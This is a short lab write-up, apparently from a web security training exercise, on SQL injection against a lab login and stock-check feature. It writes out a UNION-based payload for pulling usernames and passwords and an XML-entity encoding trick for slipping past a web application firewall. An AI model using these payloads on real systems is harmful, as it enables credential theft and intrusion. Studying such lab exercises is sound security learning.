# Third Lab: SQL Injection

Lab - 03 : SQL injection with filter bypass via XML encoding

SQL Injection : Stock check feature

End Goal : Retrieve admin’s user credentials and logging in as one

Analysis : 

1. SQl Injection applicability check → True 
    
    ```sql
    https://0a030018044ab77883ac879e00020068.web-security-academy.net/login
    ```
    
    this page asks for username and password. 
    
    Default sql query, if username is demo and password is test. 
    
    ```sql
    SELECT * FROM users WHERE username='demo' AND password='test'
    ```
    
    Modified SQL query to get the other databases using the UNION keyword.
    
    ```sql
    SELECT * FROM users WHERE username='demo' UNION SELECT username, password FROM users-- AND password='test'
    ```
    
    So my extra addition as an SQL injection would be 
    
    ```
    'UNION+SELECT+username,+password+FROM+users--
    ```
    
    This injection is being caught by WAF(Web Application Firewall). To by pass this, we have to do xml coding on the data.
    
    ```
    &#x53;ELECT * FROM users
    ```
    
    This is can be used to view the users datatable